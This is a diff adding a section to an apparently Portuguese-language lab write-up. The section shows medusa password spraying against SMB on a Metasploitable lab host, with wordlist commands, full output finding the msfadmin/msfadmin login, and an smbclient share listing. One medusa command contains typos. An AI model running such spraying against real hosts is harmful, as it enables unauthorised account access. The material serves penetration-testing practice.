@@ -149,14 +149,72 @@ WARNING: Invalid method: FAIL=Login failed.
 2026-11-10 11:58:32 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user  Password: password [SUCCESS]
 ```
 
+## Password spraying em SMB com enumeração de usuários.
+
 Linhas de comando:
 ```
 echo -e "user\nadmin\nmsfadmin\nservice" > smb_users.txt 
 echo -e "passowrd\n123456\nWelome123\nmsfadmin" > senhas_spray.txt
 ```
 
+```
+medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smnt -t 2- T50
+```
 
 
+```                                                                                                                                                                                                                
+┌──(kali㉿kali)-[~]
+└─$ medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2- T50
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: passowrd (1 of 4 complete)
+2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: 123456 (2 of 4 complete)
+2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: Welome123 (3 of 4 complete)
+2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (4 of 4 complete)
+2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 1 complete) Password: passowrd (1 of 4 complete)
+2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 1 complete) Password: 123456 (2 of 4 complete)
+2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 1 complete) Password: Welome123 (3 of 4 complete)
+2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (2 of 4, 2 complete) Password: msfadmin (4 of 4 complete)
+2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 2 complete) Password: passowrd (1 of 4 complete)
+2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 2 complete) Password: Welome123 (2 of 4 complete)
+2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 2 complete) Password: 123456 (3 of 4 complete)
+2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 4, 3 complete) Password: msfadmin (4 of 4 complete)
+2026-11-11 08:24:31 ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: service (4 of 4, 4 complete) Password: passowrd (1 of 4 complete)
+2026-11-11 08:24:31 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: service (4 of 4, 4 complete) Password: 123456 (2 of 4 complete)
+2026-11-11 08:24:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: service (4 of 4, 4 complete) Password: Welome123 (3 of 4 complete)
+2026-11-11 08:24:32 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: service (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ 
+```
+
+
+```
+(kali㉿kali)-[~]
+└─$  smbclient -L //192.168.56.102 -U msfadmin
+Password for [WORKGROUP\msfadmin]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        tmp             Disk      oh noes!
+        opt             Disk      
+        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        msfadmin        Disk      Home Directories
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            METASPLOITABLE
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ 
+```
 
 
 ## Comandos utilizados
